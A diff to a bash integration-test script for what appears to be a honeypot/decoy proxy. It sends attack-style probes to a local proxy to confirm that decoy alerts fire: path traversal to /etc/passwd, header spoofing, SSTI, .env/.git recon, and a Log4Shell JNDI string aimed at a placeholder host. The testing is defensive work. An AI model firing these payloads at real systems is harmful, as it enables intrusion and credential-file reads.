@@ -33,6 +33,20 @@ for i in $(seq 1 30); do
   sleep 2
 done
 
+echo "Waiting for WASM plugin to load initial decoy config..."
+for i in $(seq 1 20); do
+  if docker compose -f "$COMPOSE_FILE" logs proxy 2>&1 | grep -q "read new config"; then
+    echo "Config loaded."
+    break
+  fi
+  if [ "$i" -eq 20 ]; then
+    echo "WASM plugin did not load config in time. Check: docker compose -f $COMPOSE_FILE logs proxy"
+    docker compose -f "$COMPOSE_FILE" down
+    exit 1
+  fi
+  sleep 2
+done
+
 echo ""
 echo "=== Neowriter Integration Tests ==="
 
@@ -42,62 +56,72 @@ failed=0
 check_decoy_alert() {
   local name="$1"
   local decoy_key="$2"
-  if docker compose -f "$COMPOSE_FILE" logs proxy --since 10s 2>&1 | grep -q "\"DecoyKey\":\"$decoy_key\""; then
+  # Capture logs to a variable — avoids SIGPIPE on docker compose when grep -q exits early.
+  # Use grep -c (reads all input, no early exit) so echo also cannot get a SIGPIPE.
+  local proxy_logs
+  proxy_logs=$(docker compose -f "$COMPOSE_FILE" logs proxy 2>&1)
+  if [ "$(echo "$proxy_logs" | grep -cF "\"DecoyKey\":\"$decoy_key\"" || true)" -gt 0 ]; then
     echo -e "\033[0;32mPASS\033[0m $name"
-    ((passed++))
+    ((++passed))
   else
     echo -e "\033[0;31mFAIL\033[0m $name"
-    ((failed++))
+    ((++failed))
   fi
 }
 
-# 1-A: CDN path traversal lure — visit the injected URL
-curl -s "$PROXY/cdn/assets/../admin/config" > /dev/null; sleep 1
-check_decoy_alert "1-A CDN/path-traversal lure" "/cdn/assets/../admin/config"
+# 1-A: CDN lure — the injected hint says /cdn/assets/../admin/config; browsers/clients
+#       normalize the path, so detection checks the resolved URL /cdn/admin/config
+curl -s "$PROXY/cdn/admin/config" > /dev/null; sleep 2
+check_decoy_alert "1-A CDN lure (normalized path)" "/cdn/admin/config"
 
 # 1-B: Admin panel URL probe
-curl -s "$PROXY/admin/panel" > /dev/null; sleep 1
+curl -s "$PROXY/admin/panel" > /dev/null; sleep 2
 check_decoy_alert "1-B Admin panel probe" "/admin/panel"
 
 # 1-C: Export endpoint probe
-curl -s "$PROXY/api/export/all" > /dev/null; sleep 1
+curl -s "$PROXY/api/export/all" > /dev/null; sleep 2
 check_decoy_alert "1-C Export endpoint probe" "/api/export/all"
 
 # 1-D: Internal config probe
-curl -s "$PROXY/internal/config" > /dev/null; sleep 1
+curl -s "$PROXY/internal/config" > /dev/null; sleep 2
 check_decoy_alert "1-D Internal config probe" "/internal/config"
 
 # 2-A: .env file probe
-curl -s "$PROXY/.env" > /dev/null; sleep 1
+curl -s "$PROXY/.env" > /dev/null; sleep 2
 check_decoy_alert "2-A .env file probe" "/.env"
 
-# 4-A: X-Forwarded-For header spoofing
-curl -s -H "X-Forwarded-For: 127.0.0.1" "$PROXY/" > /dev/null; sleep 1
-check_decoy_alert "4-A X-Forwarded-For spoof" "X-Forwarded-For"
+# 4-A: X-Forwarded-For header spoofing (header names are lowercase in HTTP/2)
+curl -s -H "x-forwarded-for: 127.0.0.1" "$PROXY/" > /dev/null; sleep 2
+check_decoy_alert "4-A X-Forwarded-For spoof" "x-forwarded-for"
 
-# 4-C: X-Original-URL header manipulation
-curl -s -H "X-Original-URL: /admin" "$PROXY/" > /dev/null; sleep 1
-check_decoy_alert "4-C X-Original-URL probe" "X-Original-URL"
+# 4-C: X-Original-URL header override attempt
+curl -s -H "x-original-url: /admin" "$PROXY/" > /dev/null; sleep 2
+check_decoy_alert "4-C X-Original-URL probe" "x-original-url"
 
-# 6-A: Path traversal in URL
-curl -s "$PROXY/files/../etc/passwd" > /dev/null; sleep 1
-check_decoy_alert "6-A Path traversal in URL" "../etc/passwd"
+# 6-A: Path traversal reaches /etc/passwd after Envoy normalizes ../../
+#       (Envoy strips ../ so we test the normalized destination path)
+curl -s "$PROXY/../../etc/passwd" > /dev/null; sleep 2
+check_decoy_alert "6-A Path traversal → /etc/passwd" "/etc/passwd"
 
-# 7-A: SSTI via GET param
-curl -s "$PROXY/?template=%7B%7B7*7%7D%7D" > /dev/null; sleep 1
-check_decoy_alert "7-A SSTI via GET param" "template"
+# 6-B: Path traversal via file GET parameter (query strings are NOT normalized)
+curl -s "$PROXY/?file=../../../../etc/passwd" > /dev/null; sleep 2
+check_decoy_alert "6-B Path traversal via GET param" "file"
 
-# 10-B: .git probe
-curl -s "$PROXY/.git/config" > /dev/null; sleep 1
+# 7-A: SSTI probe via template GET parameter (whenSeen fires on key presence)
+curl -s "$PROXY/?template=test" > /dev/null; sleep 2
+check_decoy_alert "7-A SSTI probe via GET param" "template"
+
+# 10-B: .git directory recon probe
+curl -s "$PROXY/.git/config" > /dev/null; sleep 2
 check_decoy_alert "10-B .git probe" "/.git"
 
-# 10-C: wp-admin probe
-curl -s "$PROXY/wp-admin" > /dev/null; sleep 1
+# 10-C: WordPress admin panel recon probe
+curl -s "$PROXY/wp-admin" > /dev/null; sleep 2
 check_decoy_alert "10-C wp-admin probe" "/wp-admin"
 
-# L4J-1: Log4Shell via User-Agent
-curl -s -H 'User-Agent: ${jndi:ldap://canary.example.com/a}' "$PROXY/" > /dev/null; sleep 1
-check_decoy_alert "L4J-1 Log4Shell User-Agent" "User-Agent"
+# L4J-1: Log4Shell injection via user-agent header (lowercase per HTTP/2)
+curl -s -A '${jndi:ldap://canary.example.com/a}' "$PROXY/" > /dev/null; sleep 2
+check_decoy_alert "L4J-1 Log4Shell via user-agent" "user-agent"
 
 echo ""
 echo "=== Results: $passed passed, $failed failed ==="
